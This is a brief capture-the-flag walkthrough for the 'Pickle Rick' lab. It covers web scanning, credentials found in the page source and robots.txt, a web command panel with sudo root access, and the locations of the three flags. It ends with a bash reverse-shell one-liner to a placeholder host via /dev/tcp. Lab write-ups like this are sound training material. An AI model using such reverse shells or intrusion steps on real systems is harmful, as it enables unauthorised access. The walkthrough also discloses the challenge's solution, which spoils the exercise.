# Pickle Rick CTF
In this CTF we have to exploit a web server to find three flags.
**Walkthrough**
1. We scan the webserver using NMap, [dirb](https://www.kali.org/tools/dirb/), [nikto](https://github.com/sullo/nikto/wiki) and [Zap proxy](https://www.zaproxy.org/docs/)
2. We discover that the ports 22 and 80 are open and the file `/robots.txt`, containing the phrase "Wabbalubbadubdub"
3. We visit the web page, look at the source code and find the username "R1ckRul3s" 
4. Navigating to the login we enter the username and the phrase and get a command panel as the user "www-data"
5. With the command `sudo -l` we find out that we have root access
6. We enter `ls -la` and see a file called "Sup3rS3cretPickl3Ingred.txt" 
7. We open it with `less Sup3rS3cretPickl3Ingred.txt` and get the first flag
8. We look around the file system first `/home` and then further
9. We find the second ingredient at `/home/rick/second ingredients`
10. Because we have root access we can also look at `/root` where we find the third flag at `/root/3rd.txt`

**Notes**
- We can also access the flags via the URL, f.e. `192.168.1.101/Sup3rS3cretPickl3Ingred.txt`
- It is also possible to open a bash reverse shell but only encapsulated in a bash - c
```
bash -c `bash -1 >& /dev/tcp/x.x.x.x/8080 0>&1`
```

